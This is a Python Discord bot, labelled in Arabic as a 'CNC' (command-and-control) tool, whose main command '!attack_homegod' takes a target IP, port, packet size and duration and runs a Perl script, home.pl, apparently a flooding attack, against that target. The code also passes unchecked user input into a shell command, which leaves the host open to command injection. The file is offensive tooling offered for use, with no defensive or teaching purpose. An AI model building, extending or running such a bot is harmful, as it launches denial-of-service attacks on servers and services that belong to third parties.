import discord
from discord.ext import commands
import subprocess
import os
import asyncio
import sys

# ================== إعدادات البوت ==================
# سيتم طلب التوكن عند التشغيل
TOKEN = None
ALLOWED_CHANNEL_ID = 1513410697294254170  # معرف الغرفة المسموح بها

# تهيئة البوت مع صلاحيات قراءة المحتوى
intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix="!", intents=intents)

# ================== حدث تشغيل البوت ==================
@bot.event
async def on_ready():
    print(f'✅ بوت {bot.user} جاهز للعمل!')
    # عرض حالة البوت
    await bot.change_presence(activity=discord.Game(name="!myhelp | !status"))

# ================== دالة التحقق من الصلاحيات ==================
async def check_permissions(ctx):
    """تتحقق من أن الأمر صدر في الغرفة الصحيحة."""
    if ctx.channel.id != ALLOWED_CHANNEL_ID:
        await ctx.send(f"❌ هذا الأمر يعمل فقط في الغرفة المخصصة (ID: {ALLOWED_CHANNEL_ID}).")
        return False
    return True

# ================== الأوامر ==================

@bot.command(name="attack_homegod", aliases=["hg"])
async def attack_homegod(ctx, ip: str, port: int = 80, size: int = 1024, duration: int = 30):
    """!attack_homegod <IP> <port> <packet_size> <time>"""
    if not await check_permissions(ctx): return

    if not os.path.exists("home.pl"):
        await ctx.send("❌ ملف الهجوم (home.pl) غير موجود في المجلد!")
        return

    await ctx.send(f"⚔️ بدء هجوم home-god على {ip}:{port} لمدة {duration} ثانية...")
    try:
        # تنفيذ الأمر بشكل غير متزامن
        cmd = f"perl home.pl {ip} {port} {size} {duration}"
        process = await asyncio.create_subprocess_shell(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        stdout, stderr = await process.communicate()

        if process.returncode == 0:
            await ctx.send(f"✅ انتهى الهجوم على {ip}:{port} بنجاح.")
        else:
            await ctx.send(f"⚠️ حدث خطأ أثناء تنفيذ الهجوم. الكود: {process.returncode}")
    except Exception as e:
        await ctx.send(f"❌ فشل تنفيذ الهجوم: {e}")

@bot.command(name="status")
async def status(ctx):
    """!status - عرض حالة البوت والغرفة المسموح بها."""
    await ctx.send(f"🟢 البوت شغال | الغرفة المسموح بها: {ALLOWED_CHANNEL_ID}")

# ✅ تم تغيير اسم الأمر من help إلى myhelp
@bot.command(name="myhelp", aliases=["commands", "cmds"])
async def help_command(ctx):
    """!myhelp - عرض الأوامر المتاحة."""
    embed = discord.Embed(
        title="📋 أوامر بوت Stanley - CNC",
        description="استخدم الأوامر التالية في الغرفة المصرح بها.",
        color=0x00ff00
    )
    embed.add_field(name="!attack_homegod <IP> <port> <حجم> <وقت>", value="شن هجوم home-god", inline=False)
    embed.add_field(name="!status", value="عرض حالة البوت", inline=False)
    embed.add_field(name="!myhelp", value="عرض هذه المساعدة", inline=False)
    await ctx.send(embed=embed)

# ================== طلب التوكن وتشغيل البوت ==================
def get_token():
    """طلب التوكن من المستخدم"""
    print("="*50)
    print("🤖 تشغيل بوت Discord CNC")
    print("="*50)
    print("\n📌 للحصول على التوكن:")
    print("1. اذهب إلى https://discord.com/developers/applications")
    print("2. أنشئ تطبيق جديد")
    print("3. من القائمة الجانبية اختر 'Bot'")
    print("4. اضغط 'Reset Token' وانسخ التوكن")
    print("\n" + "="*50)
    
    token = input("🔑 أدخل توكن البوت: ").strip()
    
    if not token:
        print("❌ خطأ: التوكن لا يمكن أن يكون فارغاً!")
        sys.exit(1)
    
    return token

if __name__ == "__main__":
    # طلب التوكن من المستخدم
    TOKEN = get_token()
    
    # تشغيل البوت
    try:
        bot.run(TOKEN)
    except discord.LoginFailure:
        print("❌ خطأ: التوكن غير صحيح! تأكد من نسخه بشكل صحيح.")
    except Exception as e:
        print(f"❌ خطأ غير متوقع: {e}")
